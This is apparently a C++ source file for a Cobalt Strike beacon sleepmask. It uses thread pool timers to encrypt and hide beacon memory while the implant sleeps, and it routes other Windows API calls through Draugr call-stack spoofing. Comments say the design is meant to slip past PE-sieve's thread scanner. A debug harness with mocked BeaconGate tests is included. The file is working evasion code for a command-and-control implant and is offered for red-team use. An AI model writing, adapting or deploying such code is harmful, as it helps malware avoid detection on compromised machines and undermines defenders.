#include <windows.h>

#include "base\helpers.h"
#include "sleepmask.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"

#include "sleepmask-vs.h"
#include "library\debug.cpp"
#include "library\utils.cpp"
#include "library\stdlib.cpp"
#include "library\masking.cpp"
#include "library\gate.cpp"

/**
* Thread Pool Timer sleepmask with Draugr stack spoofing.
*
* This implementation uses Technique 4: Thread Pool Timers
* (TpAllocTimer + TpSetTimerEx) for sleep obfuscation, combined
* with Draugr call stack spoofing for all proxied BeaconGate
* API calls.
*
* Thread pool worker threads wait via NtWaitForWorkViaWorkerFactory
* which is explicitly whitelisted by PE-sieve's ThreadScanner.
*/

// Thread Pool Timers + Draugr are only supported on x64.
#ifdef _WIN64
// Additional includes for draugr.
#include "library\stackspoofing.cpp"

#ifndef _DEBUG
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$TpAllocTimer(PTP_TIMER* out, PTP_TIMER_CALLBACK callback, PVOID context, PTP_CALLBACK_ENVIRON env);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$TpSetTimerEx(PTP_TIMER timer, PLARGE_INTEGER dueTime, LONG period, LONG window);
DECLSPEC_IMPORT VOID     NTAPI NTDLL$TpReleaseTimer(PTP_TIMER timer);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtCreateEvent(PHANDLE eventHandle, ACCESS_MASK desiredAccess, PVOID objectAttributes, DWORD eventType, BOOLEAN initialState);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetEvent(HANDLE eventHandle, PLONG previousState);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtWaitForSingleObject(HANDLE handle, BOOLEAN alertable, PLARGE_INTEGER timeout);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE handle);

#define TpAllocTimer          NTDLL$TpAllocTimer
#define TpSetTimerEx          NTDLL$TpSetTimerEx
#define TpReleaseTimer        NTDLL$TpReleaseTimer
#define NtCreateEvent         NTDLL$NtCreateEvent
#define NtSetEvent            NTDLL$NtSetEvent
#define NtWaitForSingleObject NTDLL$NtWaitForSingleObject
#define NtClose               NTDLL$NtClose
#else
typedef NTSTATUS(NTAPI* TpAllocTimerPtr)(PTP_TIMER*, PTP_TIMER_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
typedef NTSTATUS(NTAPI* TpSetTimerExPtr)(PTP_TIMER, PLARGE_INTEGER, LONG, LONG);
typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
#endif

    // EVENT_TYPE values for NtCreateEvent (may not be in mingw headers).
    #ifndef EVENT_TYPE_SYNCHRONIZATION
    #define EVENT_TYPE_SYNCHRONIZATION 1
    #endif

    /**
    * Thread pool timer context passed to the timer callback.
    * Contains everything needed for the decrypt-and-wake cycle.
    */
    typedef struct _TP_TIMER_CONTEXT {
        PBEACON_INFO   BeaconInfo;
        HANDLE         hWakeEvent;
    } TP_TIMER_CONTEXT, *PTP_TIMER_CONTEXT;

    /**
    * Thread pool timer callback.
    *
    * Fires on a worker thread after the sleep interval expires.
    * Unmasks beacon and signals the main thread to resume.
    *
    * The worker thread's call stack at this point is:
    *   ntdll!NtWaitForWorkViaWorkerFactory
    *   ntdll!TppWorkerThread
    *   KERNEL32!BaseThreadInitThunk
    *   ntdll!RtlUserThreadStart
    * This is explicitly whitelisted by PE-sieve's ThreadScanner.
    *
    * @param Instance  Thread pool callback instance.
    * @param Context   Pointer to TP_TIMER_CONTEXT.
    * @param Timer     The timer that fired.
    */
    static VOID CALLBACK TimerCallback(
        PTP_CALLBACK_INSTANCE Instance,
        PVOID                 Context,
        PTP_TIMER             Timer)
    {
        PTP_TIMER_CONTEXT ctx = (PTP_TIMER_CONTEXT)Context;

        // Decrypt and restore beacon memory.
        UnMaskBeacon(ctx->BeaconInfo);

        // Signal the main thread to wake up.
        NtSetEvent(ctx->hWakeEvent, NULL);
    }

    /**
    * Configures Draugr for use in BeaconGate.
    *
    * @param pDraugrCall A pointer to a DRAUGR_FUNCTION_CALL structure.
    */
    void InitializeDraugr(PDRAUGR_FUNCTION_CALL pDraugrCall) {
        // [0] Prepare spoofed stack frame struct.
        static SYNTHETIC_STACK_FRAME stackFrame;
        _memset(&stackFrame, 0, sizeof(stackFrame));

        // [1] Attempt to resolve spoofed call stack frame.
        if (!InitFrameInfo(&stackFrame)) {
            goto Cleanup;
        }

        // [2] Set target stack frame and call gate entry point.
        pDraugrCall->StackFrame = &stackFrame;
        pDraugrCall->SpoofCall = (PVOID)SpoofCall;
        DLOGF("SLEEPMASK: Successfully configured Draugr\n");

    Cleanup:
        return;
    }

    /**
    * Performs a thread pool timer sleep cycle.
    *
    * Instead of calling Sleep() directly, this creates a thread pool
    * timer via TpAllocTimer/TpSetTimerEx. The main thread masks beacon,
    * then waits on an event. When the timer fires on a pool worker
    * thread, it unmasks beacon and signals the event to wake the
    * main thread.
    *
    * @param info      A pointer to a BEACON_INFO structure.
    * @param sleepMs   The sleep duration in milliseconds.
    */
    void ThreadPoolTimerSleep(PBEACON_INFO info, DWORD sleepMs) {
        HANDLE       hWakeEvent = NULL;
        PTP_TIMER    pTimer     = NULL;
        NTSTATUS     status     = 0;
        LARGE_INTEGER dueTime;

        // [0] Create a synchronization event (auto-reset).
        status = NtCreateEvent(&hWakeEvent, EVENT_ALL_ACCESS, NULL, EVENT_TYPE_SYNCHRONIZATION, FALSE);
        if (status != 0 || hWakeEvent == NULL) {
            DLOGF("SLEEPMASK: Failed to create wake event: 0x%08X\n", status);
            return;
        }

        // [1] Set up the timer context.
        TP_TIMER_CONTEXT timerCtx;
        _memset(&timerCtx, 0, sizeof(timerCtx));
        timerCtx.BeaconInfo = info;
        timerCtx.hWakeEvent = hWakeEvent;

        // [2] Create a thread pool timer with our callback.
        status = TpAllocTimer(&pTimer, (PTP_TIMER_CALLBACK)TimerCallback, &timerCtx, NULL);
        if (status != 0 || pTimer == NULL) {
            DLOGF("SLEEPMASK: Failed to allocate thread pool timer: 0x%08X\n", status);
            NtClose(hWakeEvent);
            return;
        }

        // [3] Arm the timer with the requested sleep duration.
        // Convert milliseconds to 100-nanosecond intervals (negative = relative).
        dueTime.QuadPart = -((LONGLONG)sleepMs * 10000LL);

        status = TpSetTimerEx(pTimer, &dueTime, 0, 0);
        if (status != 0) {
            DLOGF("SLEEPMASK: Failed to set timer: 0x%08X\n", status);
            TpReleaseTimer(pTimer);
            NtClose(hWakeEvent);
            return;
        }

        // [4] Mask beacon memory (encrypt + deprotect).
        MaskBeacon(info);

        // [5] Wait for the timer callback to fire and wake us.
        NtWaitForSingleObject(hWakeEvent, FALSE, NULL);

        // [6] Clean up.
        TpReleaseTimer(pTimer);
        NtClose(hWakeEvent);
    }

    /**
    * Sleepmask-VS entry point
    *
    * When BeaconGate routes a SLEEP call, this implementation uses
    * thread pool timers (TpAllocTimer + TpSetTimerEx) for the sleep
    * cycle with full beacon masking. For all other BeaconGate API
    * calls, Draugr stack spoofing is used.
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.
    */
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        static BOOL draugrInitialized = FALSE;
        static DRAUGR_FUNCTION_CALL draugrCall;

        // [0] If logging is enabled, print relevant debug output.
#if ENABLE_LOGGING
        if (!draugrInitialized) PrintSleepMaskInfo(info);
#endif

        // [1] Initialize Draugr.
        if (!draugrInitialized) {
            InitializeDraugr(&draugrCall);
            draugrInitialized = TRUE;
        }

        // [2] Intercept SLEEP calls: use thread pool timer instead.
        if (functionCall->function == WinApi::SLEEP) {
            DWORD sleepMs = (DWORD)(ULONG_PTR)functionCall->args[0];
            DLOGF("SLEEPMASK: Intercepting Sleep(%lu) with thread pool timer\n", sleepMs);
            ThreadPoolTimerSleep(info, sleepMs);
            functionCall->retValue = 0;
            return;
        }

        // [3] All other API calls: proxy via Draugr with stack spoofing.
        draugrCall.FunctionCall = functionCall;
        DraugrGateWrapper(info, &draugrCall);
        draugrCall.FunctionCall = NULL;

        return;
    }
}
#else
    // x86 fallback: no Draugr, no thread pool timer sleep.
    void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL functionCall) {
        DLOGF("SLEEPMASK: Calling %s via BeaconGate\n", winApiArray[functionCall->function]);
        BeaconGateWrapper(info, functionCall);

        return;
    }
}
#endif

// Define a main function for the debug build
#if defined(_DEBUG)
#include "unit-tests\syscallapi-unit-tests.cpp"
int main(int argc, char* argv[]) {
    /**
    * [0] Run a quick test BeaconGate example.
    * Note: The GateArg() Macro ensures variadic arguments are the correct size for the architecture.
    */
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        (PVOID)VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );

    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);

    // [1] Check if asm harness is passing args correctly.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing args are passed correctly");
    TestArgumentsArePassedCorrectlyWrapper();

    // [2] Now test coverage for *all* supported sys calls.
    BeaconPrintf(CALLBACK_OUTPUT, "BEACONGATE: Testing all supported sys calls");
    TestSysCallApi();

    return 0;
}

#endif
